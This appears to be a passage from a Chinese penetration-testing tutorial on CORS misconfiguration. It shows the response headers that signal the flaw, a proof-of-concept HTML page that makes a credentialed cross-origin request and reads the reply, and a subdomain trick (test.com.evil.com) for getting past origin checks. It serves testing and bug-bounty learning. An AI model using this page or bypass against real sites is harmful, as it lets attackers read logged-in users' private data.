#### oxo2 测试 CORS

当响应包结果返回下方内容说明存在CORS漏洞

```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

> Access-Control-Allow-Credentials: true 说明会携带Cookie来访问


#### oxo3  简单利用  

**1、Get 请求 POC：**

```
<html\>
     <body onload\="cors()"\>
         </div\>
         <script\>
             function cors() {
             var xhr \= new XMLHttpRequest();
             xhr.onreadystatechange \= function() {
                 if (this.readyState \== 4 && this.status \== 200) {
                 document.getElementById("demo").innerHTML \= alert(this.responseText);
                 }
             };
             xhr.open("GET","http://test.com/?id=1", true);
             xhr.withCredentials \= true;
             xhr.send();
             }
         </script\>
     </body\>
 </html\>
```

没做任何过滤和防御就可以直接打开就能触发。真实情况一般都需要登录

#### oxo4 绕过小tips  

有很多情况会校验域名

```
Access-Control-Allow-Origin: https://test.com
```

绕过方法：设置一个三级域名可绕过

```
Access-Control-Allow-Origin: https://test.com.evil.com
```

> 没域名的小伙伴在测SRC或日常测试的时候可以修改本地的 hosts 来达到测试的效果
